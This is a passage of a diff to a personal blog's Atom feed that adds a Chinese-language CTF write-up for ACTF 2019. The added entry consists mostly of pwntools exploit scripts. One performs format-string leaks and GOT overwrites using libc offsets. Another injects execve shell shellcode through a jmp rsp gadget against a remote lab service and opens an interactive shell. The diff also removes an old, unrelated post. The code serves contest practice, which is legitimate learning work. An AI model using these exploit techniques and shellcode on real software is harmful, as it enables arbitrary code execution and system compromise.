class="number">7</span>*<span class="number">8</span>-len(payload))</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">print(payload)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p1=<span class="string">'AAAA%7$s'</span>+p64(setvbuf_got)</span><br><span class="line">sh.sendline(p1)</span><br><span class="line">ret1=sh.recv(timeout = <span class="number">1</span>)</span><br><span class="line">ret1=ret1[<span class="number">4</span>:ret1.find(<span class="string">'\n'</span>)-<span class="number">3</span>]</span><br><span class="line">setvbuf_addr=u64(ret1+<span class="string">'\0'</span>*(<span class="number">8</span>-len(ret1)))</span><br><span class="line"><span class="keyword">print</span> setvbuf_addr</span><br><span class="line"></span><br><span class="line"><span class="comment">#puts_offset = 0x06f690 #https://libc.blukat.me/?q=puts%3A690&amp;l=libc6_2.23-0ubuntu10_amd64</span></span><br><span class="line"><span class="comment">#gadget_offset = 0x45216</span></span><br><span class="line"><span class="comment">#setvbuf_offset = 0x6fe70</span></span><br><span class="line"></span><br><span class="line">puts_offset = <span class="number">0x071910</span></span><br><span class="line">gadget_offset = <span class="number">0x4484f</span></span><br><span class="line">setvbuf_offset = <span class="number">0x71F90</span></span><br><span class="line"></span><br><span class="line">gadget_addr = setvbuf_addr - setvbuf_offset + gadget_offset</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    payload =<span class="string">''</span></span><br><span class="line">    <span class="keyword">if</span>(ord(p64(gadget_addr)[i])!=<span class="number">0</span>):</span><br><span class="line">        payload =<span class="string">'%'</span>+str(ord(p64(gadget_addr)[i]))+<span class="string">'c'</span></span><br><span class="line">    payload +=<span class="string">'%9$hhn'</span></span><br><span class="line">    payload +=<span class="string">'A'</span>*(<span class="number">24</span>-len(payload))</span><br><span class="line">    payload += p64(ext_got+i)</span><br><span class="line">    print(payload)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload =<span class="string">'%999999c%999999c%999999c%999999c%196084c'</span></span><br><span class="line">payload +=<span class="string">'%13$lln'</span></span><br><span class="line">payload +=<span class="string">'A'</span>*(<span class="number">7</span>*<span class="number">8</span>-len(payload))</span><br><span class="line">payload += p64(printf_got)</span><br><span class="line">print(payload)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br></pre></td></tr></table></figure>
+<hr>
+<h5 id="fsb-easy-v2"><a class="header-anchor" href="#fsb-easy-v2">¶</a>fsb easy</h5>
+<p>这题忘了当时怎么做的了<br>
+大概是ret2reg<br>
+反正没卡我多久，fsb inf 卡得久。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#0x0000000000400605 : jmp rsp</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">auth=<span class="string">'3180103367.4124bb15c1dad3091d08fdab64d5c43d'</span></span><br><span class="line">sh=remote(<span class="string">"10.214.10.18"</span>,<span class="number">10085</span>)</span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line">sh.sendline(auth)</span><br><span class="line"><span class="comment">#sh=process('./warmup')</span></span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line">jmp_rsp=<span class="number">0x00400605</span></span><br><span class="line">shellcode=<span class="string">'\x50\x48\x31\xD2\x48\x31\xF6\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xB0\x3B\x0F\x05'</span></span><br><span class="line">payload = flat([shellcode,<span class="string">'A'</span> * (<span class="number">0x8</span>+<span class="number">0x50</span>-len(shellcode)), jmp_rsp,<span class="number">0x0</span>])</span><br><span class="line">payload = payload+<span class="string">'\x48\x83\xEC\x60\xFF\xE4'</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<hr>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>代码之后会放在 <a href="https://github.com/XTXTMTXTX/ACTF-2019" target="_blank" rel="external">https://github.com/XTXTMTXTX/ACTF-2019</a><br>
+一度]]>
+    </summary>
+    
+      <category term="C++" scheme="https://www.xtxtmtxtx.xyz/tags/C/"/>
+    
+      <category term="CTF" scheme="https://www.xtxtmtxtx.xyz/tags/CTF/"/>
+    
+      <category term="Linux" scheme="https://www.xtxtmtxtx.xyz/tags/Linux/"/>
+    
+      <category term="Reverse" scheme="https://www.xtxtmtxtx.xyz/tags/Reverse/"/>
+    
+      <category term="Tech" scheme="https://www.xtxtmtxtx.xyz/categories/Tech/"/>
+    
+  </entry>
   
   <entry>
     <title><![CDATA[Why do you have to keep learning?]]></title>
@@ -863,31 +1199,6 @@ verify_proof()<br>
     <![CDATA[<p>由于学业变重加之现在我住宿了<del>(懒)</del><br>
 所以各种坑之类的只有到暑假才能填了<br>
 <del>写这个只是为了表示我还活着x</del></p>
-]]>
-    </summary>
-    
-      <category term="杂" scheme="https://www.xtxtmtxtx.xyz/tags/%E6%9D%82/"/>
-    
-      <category term="Others" scheme="https://www.xtxtmtxtx.xyz/categories/Others/"/>
-    
-  </entry>
-  
-  <entry>
-    <title><![CDATA[第一篇]]></title>
-    <link href="https://www.xtxtmtxtx.xyz/articles/%E7%AC%AC%E4%B8%80%E7%AF%87/"/>
-    <id>https://www.xtxtmtxtx.xyz/articles/第一篇/</id>
-    <published>2016-01-20T13:19:38.000Z</published>
-    <updated>2018-10-23T12:21:45.627Z</updated>
-    <content type="html"><![CDATA[<p><del>十分喜闻乐见的</del><br>
-之前的主机莫名其妙的就没了<del>这个故事告诉我们尽可能不要用Hostinger</del><br>
-<del>不要吐槽这奇怪的样式</del><br>
-还是可能什么东西都不写吧</p>
-]]></content>
-    <summary type="html">
-    <![CDATA[<p><del>十分喜闻乐见的</del><br>
-之前的主机莫名其妙的就没了<del>这个故事告诉我们尽可能不要用Hostinger</del><br>
-<del>不要吐槽这奇怪的样式</del><br>
-还是可能什么东西都不写吧</p>
 ]]>
     </summary>
     
